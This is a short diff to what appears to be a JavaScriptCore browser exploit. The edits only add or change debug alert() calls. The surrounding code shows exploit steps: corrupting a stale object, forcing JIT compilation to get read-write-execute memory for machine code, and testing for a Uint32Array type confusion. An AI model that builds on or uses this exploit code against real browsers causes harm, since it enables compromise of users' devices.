@@ -184,7 +184,6 @@ function dgc() {
 	 
 	stale[0] += 0x101;
  	stale[1] = {}
-	alert("After stale addition");
 	 
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
 	// This will force JS to create a r/w/x block of memory, with raw machine code,
@@ -245,8 +244,9 @@ function dgc() {
 					alert(stale[0] instanceof Uint32Array);
 				}
 				catch(e){
-					alert("Exp:" + e);
+					alert("Exp:" + e.message);
 				}
+				alert("After catch");
 				
 				if (stale[0] instanceof Uint32Array){
 					alert("Got proper Uint32Array!");
@@ -259,6 +259,8 @@ function dgc() {
 				} else {
 					alert("Couldn't find valid type");
 				}
+				
+				alert("After else if block");
 				
 				
 				
